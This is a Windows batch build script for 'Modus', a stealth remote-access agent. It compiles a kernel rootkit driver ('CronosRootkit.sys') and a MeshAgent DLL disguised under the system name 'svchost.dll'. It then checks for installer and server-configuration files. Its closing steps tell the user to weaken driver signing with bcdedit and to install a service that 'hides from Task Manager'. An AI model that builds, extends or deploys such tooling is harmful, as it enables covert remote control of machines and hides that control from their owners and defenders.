@echo off
REM ============================================================================
REM Modus - Complete Build Script
REM ============================================================================
REM Written by: Joel Aaron Guff
REM Script Version: 1.0
REM 
REM This script builds all components of the Modus stealth MeshAgent:
REM 1. Cronos rootkit driver (CronosRootkit.sys)
REM 2. MeshAgent service DLL (svchost.dll) 
REM 3. Verifies all components are ready for installation
REM ============================================================================

echo Modus - Complete Build Script
echo ==============================

REM Check for administrative privileges (needed for driver signing)
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo WARNING: Administrative privileges recommended for driver signing
    echo Some operations may fail without admin rights
)

REM Check Visual Studio environment
where msbuild >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Visual Studio Build Tools not found in PATH
    echo Please run this script from a Visual Studio Developer Command Prompt
    echo Or install Visual Studio 2019 with C++ build tools
    pause
    exit /b 1
)

echo [INFO] Visual Studio build environment detected

REM Check Windows Driver Kit
if not exist "%WindowsSdkDir%" (
    echo WARNING: Windows SDK not detected
    echo Driver compilation may fail
)

REM Clean previous builds
echo [INFO] Cleaning previous builds...
if exist "svchost.dll" del /q "svchost.dll"
if exist "CronosRootkit.sys" del /q "CronosRootkit.sys"

REM Build Cronos Rootkit Driver
echo.
echo ============================================================================
echo Building Cronos Rootkit Driver
echo ============================================================================
cd "Cronos Rootkit"

if not exist "Cronos Rootkit.vcxproj" (
    echo ERROR: Cronos driver project file not found
    echo Expected: Cronos Rootkit\Cronos Rootkit.vcxproj
    cd ..
    pause
    exit /b 1
)

echo [INFO] Building Cronos driver (x64 Release)...
msbuild "Cronos Rootkit.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:WindowsTargetPlatformVersion=10.0 /verbosity:minimal

if %errorLevel% neq 0 (
    echo ERROR: Cronos driver build failed
    cd ..
    pause
    exit /b 1
)

REM Check if driver was built
if exist "x64\Release\CronosRootkit.sys" (
    echo [SUCCESS] Cronos driver built successfully
    copy "x64\Release\CronosRootkit.sys" "..\CronosRootkit.sys"
) else (
    echo ERROR: Cronos driver build succeeded but CronosRootkit.sys not found
    echo Check build output directory
    cd ..
    pause
    exit /b 1
)

cd ..

REM Build MeshAgent Service DLL
echo.
echo ============================================================================  
echo Building MeshAgent Service DLL
echo ============================================================================
cd meshservice

if not exist "MeshService-2022.vcxproj" (
    echo ERROR: MeshService project file not found
    echo Expected: meshservice\MeshService-2022.vcxproj
    cd ..
    pause
    exit /b 1
)

echo [INFO] Building MeshAgent DLL (x64 Release)...
msbuild "MeshService-2022.vcxproj" /p:Configuration=Release /p:Platform=x64 /verbosity:minimal

if %errorLevel% neq 0 (
    echo ERROR: MeshAgent DLL build failed
    cd ..
    pause  
    exit /b 1
)

REM Check if DLL was built and copy to root
if exist "x64\Release\svchost64.dll" (
    echo [SUCCESS] MeshAgent DLL built successfully
    copy "x64\Release\svchost64.dll" "..\svchost.dll"
) else if exist "Release\svchost64.dll" (
    echo [SUCCESS] MeshAgent DLL built successfully
    copy "Release\svchost64.dll" "..\svchost.dll"
) else (
    echo ERROR: MeshAgent DLL build succeeded but output not found
    echo Looking for: x64\Release\svchost64.dll or Release\svchost64.dll
    cd ..
    pause
    exit /b 1
)

cd ..

REM Verify all components
echo.
echo ============================================================================
echo Build Verification
echo ============================================================================

set "build_success=true"

if exist "CronosRootkit.sys" (
    echo [OK] CronosRootkit.sys - %~zCronosRootkit.sys bytes
) else (
    echo [FAIL] CronosRootkit.sys - Missing
    set "build_success=false"
)

if exist "svchost.dll" (
    echo [OK] svchost.dll - %~zsvchost.dll bytes
) else (
    echo [FAIL] svchost.dll - Missing  
    set "build_success=false"
)

if exist "install_stealth_service.bat" (
    echo [OK] install_stealth_service.bat - Installation script ready
) else (
    echo [FAIL] install_stealth_service.bat - Missing
    set "build_success=false"
)

if exist "taskmaster.msh" (
    echo [OK] taskmaster.msh - Configuration file ready
) else (
    echo [FAIL] taskmaster.msh - Missing configuration file
    echo        Run configure_taskmaster.bat to create configuration
    set "build_success=false"
)

if exist "cleanup_stealth_service.bat" (
    echo [OK] cleanup_stealth_service.bat - Cleanup script ready
) else (
    echo [FAIL] cleanup_stealth_service.bat - Missing
    set "build_success=false"
)

echo.
if "%build_success%"=="true" (
    echo ============================================================================
    echo BUILD SUCCESSFUL!
    echo ============================================================================
    echo.
    echo All TaskMaster components have been built successfully:
    echo   ✓ Cronos rootkit driver
    echo   ✓ MeshAgent service DLL
    echo   ✓ Installation scripts
    echo   ✓ MeshCentral configuration
    echo.
    echo Next steps:
    echo   1. Enable test signing: bcdedit /set testsigning on
    echo   2. Reboot the system  
    echo   3. Configure server connection: configure_modus.bat
    echo   4. Run install_stealth_service.bat as Administrator
    echo.
    echo SECURITY WARNING:
    echo This creates a stealth service that hides from Task Manager
    echo Use cleanup_stealth_service.bat to remove safely
) else (
    echo ============================================================================
    echo BUILD FAILED!
    echo ============================================================================  
    echo.
    echo One or more components failed to build.
    echo Please check the error messages above and fix any issues.
    echo.
    echo Common issues:
    echo   - Missing Visual Studio 2019 with C++ tools
    echo   - Missing Windows Driver Kit (WDK)
    echo   - Missing required dependencies
)

echo.
pause
